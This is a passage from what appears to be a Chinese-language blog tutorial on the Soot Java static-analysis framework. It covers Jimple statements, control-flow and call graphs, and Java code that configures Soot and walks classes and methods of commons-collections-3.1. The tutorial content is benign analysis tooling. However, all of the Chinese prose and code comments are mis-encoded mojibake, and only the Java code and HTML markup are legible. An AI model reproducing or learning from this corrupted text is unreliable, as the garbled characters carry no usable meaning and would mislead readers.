çš„å¼•ç”¨</span></span><br><span class="line"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title function_">getDefBoxes</span><span class="params">()</span>;<span class="comment">//è¿”å› Unit ä¸­å®šä¹‰çš„ Value çš„å¼•ç”¨</span></span><br><span class="line"><span class="keyword">public</span> List&lt;ValueBox&gt; <span class="title function_">getUseAndDefBox</span><span class="params">()</span>;<span class="comment">//è¿”å› Unit ä¸­å®šä¹‰å¹¶ä½¿ç”¨çš„ Value çš„å¼•ç”¨</span></span><br><span class="line"><span class="keyword">public</span> List <span class="title function_">geUnitBoxes</span><span class="params">()</span>;<span class="comment">//è·å¾— Unit è·³è½¬åˆ°çš„ UnitxBox åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">public</span> List <span class="title function_">getBoxesPointingTothis</span><span class="params">()</span>;<span class="comment">//Unit ä½œä¸ºè·³è½¬å¯¹è±¡æ—¶ï¼Œè·å–æ‰€æœ‰è·³è½¬åˆ°è¯¥ Unit çš„ UnitBox</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">fallsThrough</span><span class="params">()</span>;<span class="comment">//å¦‚æœæ¥ä¸‹æ¥æ‰§è¡Œåé¢çš„ Unitï¼Œåˆ™ä¸º true</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">branches</span><span class="params">()</span>;<span class="comment">//å¦‚æœæ‰§è¡Œæ—¶ä¼šè·³è½¬åˆ°å…¶ä»– Unitï¼Œåˆ™è¿”å› trueã€‚å¦‚ï¼šIfStmtã€GotoStmt</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rediectJumpsToThisTo</span><span class="params">(Unit newLocation)</span>;<span class="comment">//æŠŠè·³è½¬åˆ° Unit é‡å®šå‘åˆ° newLocation</span></span><br></pre></td></tr></table></figure><p>Unit è¡¨ç¤ºæŸç§ç”¨äºæ‰§è¡Œçš„å•å…ƒï¼ˆä¾‹å¦‚ Jimple ä¸­çš„ Stmt å’Œ Baf ä¸­çš„ Instï¼‰</p><ul><li>Stmt ç»§æ‰¿ Unit æ¥å£ï¼ŒAssignStmtã€IdentityStmtã€IfStmtã€RetrunVoidStmtã€NopStmt ç­‰ç»§æ‰¿ Stmt æ¥å£ã€‚</li><li>Stmt å­æ¥å£</li></ul><p>Block æ˜¯åˆ’åˆ†æ–¹æ³•ä½“çš„åŸºæœ¬å—ï¼Œè¢«å®ç°ä¸ºåº•å±‚ Body å®ä¾‹çš„è§†å›¾ï¼›å› æ­¤ï¼Œå¯¹ Block æ‰€åšçš„æ›´æ”¹å°†è‡ªåŠ¨åæ˜ åœ¨å…¶å°é—­çš„æ–¹æ³•ä½“ä¸­ã€‚</p><ul><li>Block å­˜åœ¨äº BlockGraph çš„ä¸Šä¸‹æ–‡ä¸­ï¼ˆCFGï¼‰ï¼Œå›¾èŠ‚ç‚¹æ˜¯ Block å®ä¾‹ã€‚<ul><li>å¯ä»¥æŸ¥è¯¢åç»§å—å’Œå‰é©±å—</li></ul></li></ul><h2 id="æ‰§è¡Œæµ"><a href="#æ‰§è¡Œæµ" class="headerlink" title="æ‰§è¡Œæµ"></a>æ‰§è¡Œæµ</h2><p>Soot æ‰§è¡Œè¢«åˆ†æˆå‡ ä¸ªé˜¶æ®µï¼Œè¿™äº›é˜¶æ®µè¢«ç§°ä¸º Packsã€‚</p><ul><li>ç¬¬ä¸€æ­¥ç”Ÿæˆ Jimple ä»£ç ï¼Œç„¶åå°† Jimple ä»£ç è¾“å…¥åˆ°å…¶ä»– Packs ä¸­ã€‚<ul><li>é€šè¿‡è§£æ classã€jimple æˆ– java æ–‡ä»¶å†é€šè¿‡ Jimple Bodyï¼ˆjbï¼‰ä¼ é€’å®ƒä»¬çš„ç»“æœè€Œå®Œæˆçš„ã€‚</li></ul></li><li>Soot æ ¹æ®åˆ†æé—®é¢˜æ˜¯è¿‡ç¨‹å†…åˆ†æè¿˜æ˜¯è¿‡ç¨‹é—´åˆ†æï¼Œä¼šæœ‰ä¸åŒçš„æ‰§è¡Œæµã€‚<ul><li><p>è¿‡ç¨‹å†…åˆ†æç®€å•çš„è¯´å°±æ˜¯è¢«åˆ†æçš„ç¨‹åºä¸­ä¸å­˜åœ¨å‡½æ•°è°ƒç”¨ã€‚</p><img src="https://s2.loli.net/2022/03/08/tvuoyqk5MZnzAPF.jpg" style="zoom:70%;" /></li><li><p>è¿‡ç¨‹é—´åˆ†æç®€å•çš„è¯´å°±æ˜¯å­˜åœ¨å‡½æ•°è°ƒç”¨ã€‚</p><ul><li>è¿‡ç¨‹é—´åˆ†ææ—¶ï¼Œéœ€è¦æŒ‡å®š Soot è¿è¡Œåœ¨ whole-program æ¨¡å¼ä¸‹ã€‚æ­¤æ—¶ Soot ä¼šå¢åŠ ä¸‰ä¸ªé˜¶æ®µï¼šcgï¼ˆcall-graph generationï¼‰ã€wjtpï¼ˆwhole Jimple transformation packï¼‰ã€wjapï¼ˆwhole Jimple annotation packï¼‰</li></ul></li></ul></li></ul><img src="https://s2.loli.net/2022/03/08/yRuiWU3qtgLA7bs.jpg" style="zoom:70%;" /><ul><li>Pack å‘½åè§„åˆ™ï¼šç¬¬ä¸€ä¸ªå­—æ¯è¡¨ç¤ºé‡‡ç”¨å“ªç§ä¸­é—´è¯­è¨€ï¼Œä¾‹å¦‚sï¼ˆshimpleï¼‰ï¼Œjï¼ˆjimpleï¼‰ï¼Œbï¼ˆbafï¼‰ï¼Œgï¼ˆgrimpï¼‰ï¼›ç¬¬äºŒä¸ªå­—æ¯è¡¨ç¤ºè¿›è¡Œåˆ° Pack çš„å“ªä¸€æ­¥ï¼Œä¾‹å¦‚ï¼šbï¼ˆbody creationï¼‰ï¼Œtï¼ˆtransformationï¼‰ï¼Œoï¼ˆoptimizationsï¼‰ï¼Œaï¼ˆannotionï¼‰ï¼›p è¡¨ç¤ºâ€œpackâ€ï¼Œæ˜¯å¤„ç†é˜¶æ®µçš„æ„æ€ã€‚</li></ul><h2 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h2><p>Stmt ç±»å‹</p><ul><li>æ ¸å¿ƒè¯­å¥ï¼šNopStmtï¼ŒDefinitionStmtï¼ˆIdentitystmtï¼ŒAssignStmtï¼‰</li><li>è¿‡ç¨‹å†…æ§åˆ¶æµï¼šIfStmtï¼ŒGotoStmtï¼ŒTableSwitchStmtï¼ŒLookupSwitchStmt</li><li>è¿‡ç¨‹é—´æ§åˆ¶æµï¼šInvokeStmtï¼ŒReturnStmtï¼ŒReturnVoidStmt</li><li>ç›‘æ§è¯­å¥ï¼šEnterMonitorStmtï¼ŒExistMonitorStmt</li><li>å…¶ä»–ç±»å‹ï¼šThrowStmtï¼ŒRetStmtï¼ˆä¸å†ä½¿ç”¨ï¼‰</li></ul><p>Unit è¡¨ç¤ºæŸç§ç”¨äºæ‰§è¡Œçš„å•å…ƒï¼ˆä¾‹å¦‚ Jimple ä¸­çš„ Stmt å’Œ Baf ä¸­çš„ Instï¼‰</p><ul><li>Stmt ç»§æ‰¿ Unit æ¥å£ï¼ŒAssignStmtã€IdentityStmtã€IfStmtã€RetrunVoidStmtã€NopStmt ç­‰ç»§æ‰¿ Stmt æ¥å£ã€‚</li><li>Stmt å­æ¥å£</li></ul><img src="https://s2.loli.net/2022/03/28/cUWjMXu3klbeLBN.png" style="zoom:80%;" /><p>Block æ˜¯åˆ’åˆ†æ–¹æ³•ä½“çš„åŸºæœ¬å—ï¼Œè¢«å®ç°ä¸ºåº•å±‚ Body å®ä¾‹çš„è§†å›¾ï¼›å› æ­¤ï¼Œå¯¹ Block æ‰€åšçš„æ›´æ”¹å°†è‡ªåŠ¨åæ˜ åœ¨å…¶å°é—­çš„æ–¹æ³•ä½“ä¸­ã€‚</p><ul><li>Block å­˜åœ¨äº BlockGraph çš„ä¸Šä¸‹æ–‡ä¸­ï¼ˆCFGï¼‰ï¼Œå›¾èŠ‚ç‚¹æ˜¯ Block å®ä¾‹ã€‚<ul><li>å¯ä»¥æŸ¥è¯¢åç»§å—å’Œå‰é©±å—</li></ul></li></ul><p>æ¯æ¡ Stmt æ˜¯ä¸€ä¸ª Unitï¼Œå¤šä¸ª Unit æ„æˆ Block</p><ul><li>Unit ä¸­çš„è·³è½¬ä¿¡æ¯ï¼šæ§åˆ¶æµ</li><li>Unit ä¸­çš„æ•°æ®ï¼šæ•°æ®æµ</li></ul><h2 id="è¿‡ç¨‹å†…åˆ†æ"><a href="#è¿‡ç¨‹å†…åˆ†æ" class="headerlink" title="è¿‡ç¨‹å†…åˆ†æ"></a>è¿‡ç¨‹å†…åˆ†æ</h2><p>UnitGraph</p><ul><li>BriefUnitGraphï¼šæ­£å¸¸ï¼Œå¼‚å¸¸åˆ†ç¦»ã€‚å°†æ­£å¸¸æµç¨‹ä¸å¼‚å¸¸å¤„ç†æµç¨‹è¿›è¡Œäº†åˆ†ç¦»ï¼Œä¸ç›¸äº¤ï¼Œåœ¨æœ€åæ‰æ±‡èšã€‚</li><li>ExceptionalUnitGraphï¼šå°†æ­£å¸¸æµç¨‹ä¸å¼‚å¸¸å¤„ç†æµç¨‹è¿›è¡Œäº†èåˆ</li><li>TrapUnitGraphï¼šç›¸å¯¹äº ExceptionalUnitGraphï¼Œä¸€äº›æ™®é€šçš„è¯­å¥ä¹Ÿä¼šè·³è½¬åˆ°å¼‚å¸¸æµç¨‹ä¸­ã€‚<ul><li>å³è®¤ä¸º try ä¸­åŒ…å«çš„æ‰€æœ‰çš„è¯­å¥éƒ½æœ‰å¯èƒ½è§¦å‘å¼‚å¸¸</li></ul></li><li>EnhancedUnitGraphï¼šå¼‚å¸¸æµåœ¨ try-catch-finally å—çº§åˆ«è€Œä¸æ˜¯ Unit çº§åˆ«è¡¨ç¤º</li></ul><img src="https://s2.loli.net/2022/03/28/uOFZsUvJfWkwcMR.png" style="zoom:80%;" /><p>BlockGraph </p><ul><li>BriefBlockGraphï¼šä¸å¼‚å¸¸ç›¸å…³çš„æ§åˆ¶æµè¢«å¿½ç•¥ï¼Œå› æ­¤å›¾å°†æ˜¯ä¸€ä¸ªæ£®æ—ï¼Œå…¶ä¸­æ¯ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºæ„æˆä¸€ä¸ªä¸ç›¸äº¤çš„å­å›¾ã€‚</li><li>ExceptionalBlockGraphï¼šè€ƒè™‘ä¸å¼‚å¸¸ç›¸å…³çš„æ§åˆ¶æµï¼šå½“ä¸€ä¸ª Unit å¯èƒ½æŠ›å‡ºä¸€ä¸ªè¢« Body å†…çš„ Trap æ•è·çš„å¼‚å¸¸æ—¶ï¼Œå¼‚å¸¸ Unit åˆ›å»ºä¸€ä¸ªæ–°çš„åŸºæœ¬å—ã€‚<ul><li>å½“ Unit å¯èƒ½æŠ›å‡ºçš„æ‰€æœ‰å¼‚å¸¸éƒ½å°†é€ƒè„±æ–¹æ³•è€Œæœªè¢«æ•è·æ—¶ï¼Œä¸ä¼šåˆ›å»ºæ–°å—</li></ul></li><li>ClassicCompleteBlockGraphï¼šè€ƒè™‘ä¸å¼‚å¸¸ç›¸å…³çš„æ§åˆ¶æµï¼Œå½“ä¸€ä¸ª Unit å¯èƒ½æŠ›å‡ºä¸€ä¸ªè¢« Body å†…çš„ Trap æ•è·çš„å¼‚å¸¸æ—¶ï¼Œå¼‚å¸¸ Unit ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„åŸºæœ¬å—ã€‚ä»…ç”¨äºæµ‹è¯•ï¼Œä¸åº”ç”¨äºå®é™…åˆ†æã€‚</li><li>ArrayRefBlockGraphï¼šèŠ‚ç‚¹æ˜¯ Block å®ä¾‹ï¼Œå…¶ä¸­åŒ…å«æ•°ç»„å¼•ç”¨çš„ Unit å°†åˆ›å»ºæ–°å—ã€‚å¼‚å¸¸æ§åˆ¶æµè¢«å¿½ç•¥ï¼Œå› æ­¤å›¾å°†æ˜¯ä¸€ä¸ªæ£®æ—ï¼Œå…¶ä¸­æ¯ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºæ„æˆä¸€ä¸ªä¸ç›¸äº¤çš„å­å›¾ã€‚</li><li>ZonedBlockGraphï¼šèŠ‚ç‚¹æ˜¯ Block å®ä¾‹ï¼Œå¹¶ä¸”åœ¨ä¸ºæä¾›çš„ Body æŸ¥æ‰¾ Block æ—¶ä¼šè€ƒè™‘å¼‚å¸¸è¾¹ç•Œã€‚<ul><li>ä»»ä½•ä½œä¸ºç¬¬ä¸€ä¸ªè¢«æŸä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºè½¬æ¢çš„ Unit éƒ½å°†åˆ›å»ºä¸€ä¸ªæ–°å—ï¼Œä»»ä½•ä½œä¸ºæœ€åä¸€ä¸ªè¢«æŸä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºè¦†ç›–çš„å•å…ƒï¼Œéƒ½å°†ç»“æŸå®ƒæ‰€å±çš„å—ã€‚ç„¶è€Œï¼Œè¿™äº› Zone å¹¶æ²¡æœ‰è¢«åˆ†å‰²ä»¥è¡¨æ˜å¼‚å¸¸å¯èƒ½å¯¼è‡´æ§åˆ¶åœ¨å®Œæˆä¹‹å‰é€€å‡ºè¯¥åŒºåŸŸã€‚</li></ul></li><li>EnhancedBlockGraph</li></ul><img src="https://s2.loli.net/2022/03/28/cC61pz25HyXhuMq.png" style="zoom:80%;" /><p>CFGViewer å‘½ä»¤è¡Œå·¥å…·</p><ul><li>åœ¨ jtp é˜¶æ®µç»˜åˆ¶ cfgï¼Œé»˜è®¤ç”Ÿæˆçš„æ˜¯ <code>BriefUnitGraph</code></li></ul><img src="https://s2.loli.net/2022/03/28/i1O2HrKMh8ylac5.jpg" style="zoom:70%;" /><h2 id="è¿‡ç¨‹é—´åˆ†æ"><a href="#è¿‡ç¨‹é—´åˆ†æ" class="headerlink" title="è¿‡ç¨‹é—´åˆ†æ"></a>è¿‡ç¨‹é—´åˆ†æ</h2><ul><li>CG è°ƒç”¨å›¾ï¼ŒèŠ‚ç‚¹æ˜¯æ–¹æ³•ï¼Œè¾¹æ˜¯è°ƒç”¨<ul><li>éœ€è¦è®¾ç½®å…¥å£ç‚¹ï¼Œæˆ–å¤šçº¿ç¨‹è·Ÿè¸ªï¼ˆå¤šä¸ªå…¥å£ç‚¹ï¼‰</li><li>æ‰‹åŠ¨æ„é€ ï¼šéå†æ‰€æœ‰ç±»çš„æ–¹æ³•ï¼Œè®°å½•æ–¹æ³•å†…çš„æ–¹æ³•è°ƒç”¨</li></ul></li><li>ICFG &#x3D; CG + CFG<ul><li>ç»™æ‰€æœ‰æ–¹æ³•çš„ CFG åŠ ä¸Šæ–¹æ³•ä¹‹é—´äº’ç›¸è°ƒç”¨çš„è¾¹ï¼ˆCGï¼‰æ‰€å½¢æˆçš„å›¾</li><li>è°ƒç”¨è¾¹ï¼ˆcall edgeï¼‰ä»è°ƒç”¨è¯­å¥ï¼ˆcall siteï¼‰è¿åˆ°è¢«è°ƒæ–¹æ³•ï¼ˆcalleeï¼‰çš„å…¥å£</li><li>ä¸ CG ä¸åŒçš„æ˜¯ï¼ŒICFG é™¤äº†è°ƒç”¨è¾¹ï¼Œè¿˜åŒ…å«ç›¸åº”çš„è¿”å›è¾¹ï¼ˆreturn edgeï¼‰ï¼Œä» callee çš„å‡ºå£è¿åˆ° call site ä¹‹åæ‰§è¡Œçš„ä¸‹ä¸€ä¸ªè¯­å¥ã€‚</li></ul></li></ul><p>ICFG</p><ul><li>JimpleBasedInterproceduralCFGï¼šInterproceduralCFG æ¥å£çš„é»˜è®¤å®ç°<ul><li>åŒ…æ‹¬é€šè¿‡æ˜¾å¼è°ƒç”¨è¯­å¥æˆ–é€šè¿‡è°ƒç”¨ <code>Thread.start()</code> ä» <code>Scene.getEntryPoints()</code> å¯è¾¾çš„æ‰€æœ‰è¯­å¥</li><li>æ­¤ç±»è¢«è®¾è®¡ä¸ºçº¿ç¨‹å®‰å…¨çš„ï¼Œå¹¶ä¸”æ­¤ç±»çš„å­ç±»ä¹Ÿå¿…é¡»ä»¥çº¿ç¨‹å®‰å…¨çš„æ–¹å¼è®¾è®¡</li></ul></li><li>BackwardsInterproceduralCFGï¼šä¸ JimpleBasedInterproceduralCFG ç›¸åŒï¼Œä½†åŸºäºå€’ç½®çš„ UnitGraphï¼Œç”¨äºåå‘åˆ†æã€‚</li><li>OnTheFlyJimpleBasedICFGï¼šå®æ—¶è®¡ç®— ICFGï¼Œå³å¯ä»¥åœ¨ä¸é¢„å…ˆè®¡ç®—è°ƒç”¨å›¾çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚<ul><li>å®ç°é€šè¿‡ç±»å±‚æ¬¡ç»“æ„åˆ†æ (CHA) è§£æè°ƒç”¨ï¼Œé€šè¿‡ FastHierarchy å®ç°ã€‚</li><li>CHA ç”± LocalMustNotAliasAnalysis æ”¯æŒï¼Œç”¨äºç¡®å®šåœ¨ InvokeVirtual æˆ– InvokeInterface è°ƒç”¨ç‚¹ä¸Šå¯¹è±¡çš„å…·ä½“ç±»å‹å·²çŸ¥çš„æƒ…å†µã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œå¯ä»¥å…·ä½“è§£å†³è°ƒç”¨ï¼Œå³ï¼Œå¯¹å•ä¸ªç›®æ ‡è¿›è¡Œè°ƒç”¨ã€‚</li><li>ä¸ºäº†æ›´ç²¾ç¡®ï¼ˆsoundï¼‰ï¼Œå¯¹äºæ— æ³•å…·ä½“è§£æçš„ InvokeInterface è°ƒç”¨ï¼ŒOnTheFlyJimpleBasedICFG è¦æ±‚ç±»è·¯å¾„ä¸Šçš„æ‰€æœ‰ç±»è‡³å°‘åŠ è½½åˆ°ç­¾åã€‚è¿™å¿…é¡»åœ¨è®¡ç®— FastHierarchy ä¹‹å‰å®Œæˆï¼Œä»¥ä¾¿å±‚æ¬¡ç»“æ„å®Œå¥½æ— æŸã€‚å®¢æˆ·ç«¯åº”è°ƒç”¨ <code>loadAllClassesOnClassPathToSignatures()</code> å°†æ‰€æœ‰éœ€è¦çš„ç±»åŠ è½½åˆ°æ­¤çº§åˆ«ã€‚</li></ul></li></ul><img src="https://s2.loli.net/2022/03/28/YEjIABgpKGVavsy.png" style="zoom:80%;" /><h1 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h1><p>æŠŠ jar æ–‡ä»¶è§£å‹åˆ°æ–‡ä»¶å¤¹ï¼Œå¦‚å›¾ï¼š</p><img src="https://s2.loli.net/2022/02/23/h5dMQPBt4oA8Kkl.png" style="zoom:80%;" /><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>ä½¿ç”¨ <code>Scene.v().loadBasicClasses()</code> æˆ– <code>Scene.v().loadNecessaryClasses()</code>ï¼Œä¸ç”¨éƒ½å†™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\linki\\Desktop\\demo&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">sourceDirectory</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\linki\\Desktop\\demo\\commons-collections-3.1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setupSoot</span><span class="params">()</span> &#123;</span><br><span class="line">    G.reset();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºæ ¼å¼</span></span><br><span class="line">    Options.v().set_output_dir(output); <span class="comment">// è®¾ç½® IR Jimple çš„è¾“å‡ºç›®å½•</span></span><br><span class="line">    Options.v().set_output_format(Options.output_format_jimple);</span><br><span class="line"></span><br><span class="line">    Options.v().set_process_dir(Collections.singletonList(sourceDirectory));    <span class="comment">// å¾…åˆ†æçš„è·¯å¾„</span></span><br><span class="line">    <span class="comment">// Options.v().set_soot_classpath(sourceDirectory);    // JDK å’Œå¾…åˆ†æçš„ jar éƒ½è¦åŠ å…¥ classpath</span></span><br><span class="line"></span><br><span class="line">    Options.v().set_prepend_classpath(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_allow_phantom_refs(<span class="literal">true</span>);</span><br><span class="line">    Options.v().set_keep_line_number(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    Options.v().set_whole_program(<span class="literal">true</span>);    <span class="comment">// å…¨ç¨‹åºåˆ†æ</span></span><br><span class="line">    Options.v().set_verbose(<span class="literal">true</span>);          <span class="comment">// æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//    Scene.v().loadBasicClasses();</span></span><br><span class="line">    Scene.v().loadNecessaryClasses();   <span class="comment">// åŠ è½½ Soot ä¾èµ–çš„ç±»å’Œå‘½ä»¤è¡ŒæŒ‡å®šçš„ç±»</span></span><br><span class="line">    Scene.v().loadDynamicClasses();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="éå†"><a href="#éå†" class="headerlink" title="éå†"></a>éå†</h2><p>éå†æ‰€æœ‰ç±»åŠå…¶æ–¹æ³•ï¼Œæ³¨æ„ï¼š</p><ul><li><code>loadXXX</code> æ–¹æ³•è¯»å–çš„ç±»ä¸å¤šï¼Œç›´æ¥éå† JDK è·¯å¾„è¯»å–æ‰å…¨é¢ï¼›</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// é…ç½®</span></span><br><span class="line">    setupSoot();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰§è¡Œåˆ†æ</span></span><br><span class="line">    PackManager.v().runPacks();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆè®¡</span></span><br><span class="line">    System.out.printf(<span class="string">&quot;%d = %d + %d + %d%n&quot;</span>,</span><br><span class="line">            Scene.v().getClasses().size(),</span><br><span class="line">            Scene.v().getApplicationClasses().size(),</span><br><span class="line">            Scene.v().getLibraryClasses().size(),</span><br><span class="line">            Scene.v().getPhantomClasses().size()</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (SootClass klass : Scene.v().getClasses()) &#123;</span><br><span class="line">        <span class="comment">// ç±»å</span></span><br><span class="line">        System.out.println(klass.getName());</span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">for</span> (SootMethod method : klass.getMethods()) &#123;</span><br><span class="line">            <span class="comment">// æ–¹æ³•ç­¾å</span></span><br><span class="line">            System.out.println(method.getSignature());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç±»ä¿¡æ¯"><a href="#ç±»ä¿¡æ¯" class="headerlink" title="ç±»ä¿¡æ¯"></a>ç±»ä¿¡æ¯</h2><p>æ ¹æ®ç±»åè·å¾—ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootClass</span> <span class="variable">klass</span> <span class="operator">=</span> Scene.v().getSootClass(<span class="string">&quot;java.io.ObjectInputStream&quot;</span>);</span><br><span class="line">System.out.println(klass.getJavaPackageName());         <span class="comment">// åŒ…å</span></span><br><span class="line">System.out.println(klass.getSuperclass().getName());    <span class="comment">// çˆ¶ç±»å</span></span><br><span class="line">System.out.println(klass.getName());                    <span class="comment">// ç±»å</span></span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•ä¿¡æ¯"><a href="#æ–¹æ³•ä¿¡æ¯" class="headerlink" title="æ–¹æ³•ä¿¡æ¯"></a>æ–¹æ³•ä¿¡æ¯</h2><p>æ ¹æ®æ–¹æ³•ç­¾åè·å¾—æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootMethod</span> <span class="variable">method</span> <span class="operator">=</span> Scene.v().getMethod(<span class="string">&quot;&lt;java.io.ObjectInputStream: java.lang.Object readObject()&gt;&quot;</span>);</span><br><span class="line">System.out.println(method.getDeclaringClass().getName());   <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">System.out.println(method.getSignature());                  <span class="comment">// ç­¾å</span></span><br><span class="line">System.out.println(method.getSubSignature());               <span class="comment">// å­ç­¾å</span></span><br><span class="line">System.out.println(method.getName());                       <span class="comment">// æ–¹æ³•å</span></span><br></pre></td></tr></table></figure><p>åˆ†ææ–¹æ³•ä½“ï¼Œæ³¨æ„ï¼š</p><ul><li>æœ‰äº›æ–¹æ³•æ²¡æœ‰æ–¹æ³•ä½“ï¼Œ<code>hasActiveBody</code> å°†è¿”å› false</li><li><code>retrieveActiveBody</code> ä¼šä¸ºæ²¡æœ‰æ–¹æ³•ä½“çš„æ–¹æ³•æ„å»ºæ–¹æ³•ä½“ï¼Œä½†å¯èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œå¤„ç†ä¹‹åç¬¬äºŒæ¬¡è°ƒç”¨å°†å¾—åˆ°æ–¹æ³•ä½“</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(method.hasActiveBody() + <span class="string">&quot;: &quot;</span> + method.getSignature());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Jimple Body</span></span><br><span class="line"><span class="type">JimpleBody</span> <span class="variable">jb</span> <span class="operator">=</span> (JimpleBody) method.retrieveActiveBody();</span><br><span class="line"></span><br><span class="line"><span class="comment">// éå†å…¶ä¸­çš„ Unit</span></span><br><span class="line"><span class="keyword">for</span> (Unit u : jb.getUnits()) &#123;</span><br><span class="line">    <span class="comment">// è¯­å¥</span></span><br><span class="line">    <span class="type">Stmt</span> <span class="variable">stmt</span> <span class="operator">=</span> (Stmt) u;</span><br><span class="line">    <span class="keyword">if</span> (stmt.containsInvokeExpr()) &#123;</span><br><span class="line">        <span class="type">InvokeExpr</span> <span class="variable">invokeExpr</span> <span class="operator">=</span> stmt.getInvokeExpr();</span><br><span class="line">        invokeExpr.apply(<span class="keyword">new</span> <span class="title class_">AbstractExprSwitch</span>() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke instance method; special handling for superclass, private, and instance initialization method invocations</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">caseSpecialInvokeExpr</span><span class="params">(SpecialInvokeExpr v)</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.caseSpecialInvokeExpr(v);</span><br><span class="line">                System.out.println(<span class="string">&quot;(caseSpecialInvokeExpr): &quot;</span> + v.getMethod().getSignature());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Invoke a class (static) 